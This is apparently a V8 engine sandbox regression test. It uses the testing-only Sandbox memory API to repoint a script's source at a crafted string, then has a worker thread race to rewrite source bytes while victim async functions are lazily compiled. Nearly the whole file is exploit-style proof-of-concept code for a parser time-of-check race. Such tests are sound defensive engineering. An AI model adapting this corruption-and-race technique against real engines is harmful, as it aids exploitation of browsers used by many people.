// Copyright 2026 the V8 project authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

// Flags: --sandbox-testing --allow-natives-syntax --expose-gc

const kNumVictims = 40;
const kNumAwaits = 8;
const kDelayStatements = '1;'.repeat(500);
const kAwaitStatements = 'await 1;'.repeat(kNumAwaits);
const kSeqTwoByteHeaderSize = 12;

function buildSources(count) {
  const origParts = ['/*\u0100   */'];
  const replParts = ['/*\u0100   */'];
  for (let i = 0; i < count; i++) {
    const body =
        `let f = async function inner() { ` +
        `await using x = null; ${kAwaitStatements} ${kDelayStatements} ` +
        `let y = 1; let z_${i} = 2; }();`;
    const placeholder = '()=>0;' + ' '.repeat(body.length - 6);
    origParts.push(`function victim_${i}() { ${placeholder} }\n`);
    replParts.push(`function victim_${i}() { ${body} }\n`);
  }
  const origSrc = origParts.join('');
  const replSrc = replParts.join('');
  origSrc.indexOf('___');
  replSrc.indexOf('___');
  return {origSrc, replSrc};
}

const {origSrc, replSrc} = buildSources(kNumVictims);
(0, eval)(origSrc);

const memory = new DataView(new Sandbox.MemoryView(0, 2 ** 32));
const offsetOf = (object, field) =>
    Sandbox.getFieldOffset(Sandbox.getInstanceTypeIdOf(object), field);
const fieldOffset = (typeName, field) =>
    Sandbox.getFieldOffset(Sandbox.getInstanceTypeIdFor(typeName), field);

gc();
gc();

let replSeqAddr = Sandbox.getAddressOf(replSrc);
if (Sandbox.getInstanceTypeOf(replSrc).startsWith('CONS_')) {
  replSeqAddr =
      memory.getUint32(replSeqAddr + offsetOf(replSrc, 'first'), true) - 1;
}

const victimAddr = Sandbox.getAddressOf(globalThis.victim_0);
const sfiAddr =
    memory.getUint32(
        victimAddr + offsetOf(globalThis.victim_0, 'shared_function_info'),
        true) -
    1;
const scriptAddr =
    memory.getUint32(
        sfiAddr + fieldOffset('SHARED_FUNCTION_INFO_TYPE', 'script'), true) -
    1;
const scriptSourceOffset =
    fieldOffset('SCRIPT_TYPE', 'wasm_managed_native_module') - 36;

memory.setUint32(
    scriptAddr + scriptSourceOffset, (replSeqAddr + 1) >>> 0, true);

const sourceAddr = replSeqAddr;
const syncByteOffset = sourceAddr + kSeqTwoByteHeaderSize + 4;
const readyByteOffset = sourceAddr + kSeqTwoByteHeaderSize + 6;

const targetOffsets = [];
for (let i = 0; i < kNumVictims; i++) {
  const charIndex = replSrc.indexOf(`let z_${i} = 2`) + 4;
  const byteOffset = sourceAddr + kSeqTwoByteHeaderSize + charIndex * 2;
  memory.setUint16(byteOffset, 0x79, true);
  const tokenLength = (`z_${i}`).length;
  for (let j = 1; j < tokenLength; j++) {
    memory.setUint16(byteOffset + j * 2, 0x20, true);
  }
  targetOffsets.push(byteOffset);
}

function workerMain() {
  const dv = new DataView(new Sandbox.MemoryView(0, 2 ** 32));
  function spin(offsets, syncOffset, readyOffset) {
    dv.setUint16(readyOffset, 1, true);
    while (true) {
      const idx = dv.getUint16(syncOffset, true);
      if (idx >= offsets.length) break;
      const off = offsets[idx];
      dv.setUint16(off, 0x79, true);
      dv.setUint16(off, 0x79, true);
      dv.setUint16(off, 0x79, true);
      dv.setUint16(off, 0x79, true);
      dv.setUint16(off, 0x7a, true);
    }
  }
  %NeverOptimizeFunction(spin);
  onmessage = function(e) {
    const {offsets, syncOffset, readyOffset} = e.data;
    spin(offsets, syncOffset, readyOffset);
  };
}

memory.setUint16(syncByteOffset, 0, true);
memory.setUint16(readyByteOffset, 0, true);

const worker = new Worker(workerMain, {type: 'function'});
worker.postMessage({
  offsets: targetOffsets,
  syncOffset: syncByteOffset,
  readyOffset: readyByteOffset,
});
while (memory.getUint16(readyByteOffset, true) === 0) {}

for (let i = 0; i < kNumVictims; i++) {
  memory.setUint16(syncByteOffset, i, true);
  for (let attempt = 0; attempt < 200; attempt++) {
    try {
      globalThis[`victim_${i}`]();
      break;
    } catch (e) {
    }
  }
}
memory.setUint16(syncByteOffset, kNumVictims, true);
